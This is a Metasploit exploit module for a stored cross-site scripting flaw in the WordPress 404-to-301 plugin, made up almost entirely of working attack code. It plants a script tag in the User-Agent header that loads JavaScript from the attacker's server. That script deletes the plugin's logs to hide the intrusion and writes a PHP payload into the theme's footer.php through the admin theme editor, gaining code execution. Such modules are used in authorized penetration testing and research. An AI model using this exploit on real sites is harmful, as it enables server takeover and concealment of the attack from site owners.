##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'					 => 'Stored Cross-Site Scripting in 404-to-301 plugin',
			'Description'		=> 'Summer of Pwnage example module',
			'Platform'			 => 'php',
			'License'				=> MSF_LICENSE,
			'Author'				 => 'Summer of Pwnage',
			'Payload'				=> { 'BadChars'		=> "'\"" } ,
			'Arch'					 => ARCH_PHP,
			'Targets'				=> [
				['Automatic Targeting', { 'auto' => true }	],
				['Cross-Site Scripting in 404-to-301 plugin', { 'auto' => false } ],
				],
				'DisclosureDate' => 'November 2016',
				'DefaultTarget'	=> 0))

				register_options([
					OptInt.new('HTTPDELAY',		[false,
					 'Number of seconds the web server will wait before terminating', 600]),
					OptString.new('URIPATH',	[ true, "The URI to used to serve JS payload", "/" ]),
					OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
				], self.class)
	end

	def check
		begin
			res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,
			 'wp-content/plugins/404-to-301/readme.txt'), })
			 
			if (res && res.body.include?('404 to 301'))
			
				res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,
				 rand_text_alpha_lower(10)),
					'redirect_depth' => 0})
					
				if (res && res.redirect?)
					@my_target = targets[1] if target['auto']
					return Exploit::CheckCode::Appears
				end
			end

			return Exploit::CheckCode::Safe
					
			rescue ::Rex::ConnectionError
				return Exploit::CheckCode::Safe
			end
	end

	def on_request_uri(cli, request)
		resp = create_response(200, "OK")
		resp.body = %Q|jQuery('*').hide();

_wpnonce = jQuery('input[type=hidden][name=_wpnonce]').val();
_wp_http_referer = jQuery('input[name=_wp_http_referer]').val();
	
data = 'action=bulk-all-delete&paged=1&action2=-1' +
'&_wpnonce=' + encodeURIComponent(_wpnonce) +
'&_wp_http_referer=' + encodeURIComponent(_wp_http_referer);

jQuery.post({
	url: 'admin.php?page=i4t3-logs',
	data: data
});

jQuery.ajax({
		url: 'theme-editor.php?file=footer.php',
		dataType: 'text',
		success: function(data) {
			var form = jQuery('<div>').html(data)[0].getElementsByTagName("form")[1];
			jQuery('body').append(form);
			
			_wpnonce = jQuery('form[name=template] input[type=hidden][name=_wpnonce]').val();
			_wp_http_referer = jQuery('form[name=template] input[name=_wp_http_referer]').val();
			theme = jQuery('form[name=template] input[name=theme]').val();
			scrollto = jQuery('form[name=template] input[name=scrollto]').val();
			newcontent = jQuery('form[name=template] #newcontent').val() + 
				'<?php #{payload.encoded} ?>';
			
			data = 'action=update&file=footer.php&submit=Update+File&docs-list=' +
						 '&_wpnonce=' + encodeURIComponent(_wpnonce) +
						 '&_wp_http_referer=' + encodeURIComponent(_wp_http_referer) +
						 '&theme=' + encodeURIComponent(theme) +
						 '&scrollto=' + encodeURIComponent(scrollto) +
						 '&newcontent=' + encodeURIComponent(newcontent);

			jQuery.post({
				url: 'theme-editor.php?',
				data: data,
				success: function(data) {
					jQuery.ajax({
						url: '/',
						timeout: 1000,
						success: function(data) {
							location.reload();
						},
						error: function(data) {
							location.reload();
						}
					});
				}
			});
		}
});|
		resp['Content-Type'] = 'text/javascript'
		cli.send_response(resp)
	end

	def exploit
		@my_target = target
		if @my_target['auto']
			check_code = check

			unless check_code == Exploit::CheckCode::Detected ||
			 check_code == Exploit::CheckCode::Appears
			 
				print_error("#{peer} - Failed to detect a vulnerable instance")
				fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable instance")
			end

			if @my_target.nil? || @my_target['auto']
				print_error("#{peer} - Failed to auto detect, try setting a manual target")
				fail_with(Failure::NoTarget,
				 "#{peer} - Failed to auto detect, try setting a manual target")
			end
		end

		print_status("#{peer} - Exploiting #{@my_target.name}")
		
		js_url = 'http://' + datastore['LHOST'] + ':' + datastore['SRVPORT'].to_s +
		 datastore['URIPATH']
		send_request_cgi({
			'method' => 'GET',
			'uri' => normalize_uri(target_uri.path, rand_text_alpha_lower(10)),
			'headers' => { 'User-Agent' => "<script src=#{js_url}></script>" },
		})
		
		begin
			Timeout.timeout(datastore['HTTPDELAY']) { super }
		rescue Timeout::Error
			# When the server stops due to our timeout, this is raised
		end
	end
end
